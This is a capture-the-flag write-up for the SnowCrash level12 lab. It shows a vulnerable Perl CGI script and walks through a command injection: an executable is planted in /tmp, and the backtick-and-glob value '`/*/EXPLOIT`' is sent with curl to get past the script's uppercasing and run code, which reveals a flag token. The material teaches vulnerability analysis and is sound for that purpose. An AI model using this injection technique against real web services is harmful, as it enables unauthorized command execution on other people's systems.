in this level we have a perl code that launches a web service (CGI) that takes two params `x` and `y`

```perl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param}; # Use CGI module to handle web parameters
print "Content-type: text/html\n\n"; # Print HTTP header (minimal, just content-type)

# Function t - performs a pattern matching operation
sub t {
  $nn = $_[1]; # Second parameter (y)
  $xx = $_[0]; # First parameter (x)
  $xx =~ tr/a-z/A-Z/; # Convert x to uppercase (case insensitive matching)
  $xx =~ s/\s.*//; # Remove everything after first whitespace in x
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # Execute egrep command with potentially unsafe user input
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

we see that we can inject shell code if we play it right.

the first regular expression convert all letters to uppercase

and the second one Remove everything after first whitespace

the solution is to create file containing our script in the `/tmp/` dir and make it executable

then after that we give the program this x param '`/*/EXPLOIT`'

```shell
level12@SnowCrash:~$ echo "getflag > /tmp/flag " > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
level12@SnowCrash:~$ curl http://127.0.0.1:4646/?x='`/*/EXPLOIT`'
..level12@SnowCrash:~cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$
```

and there you go we got this flag too.
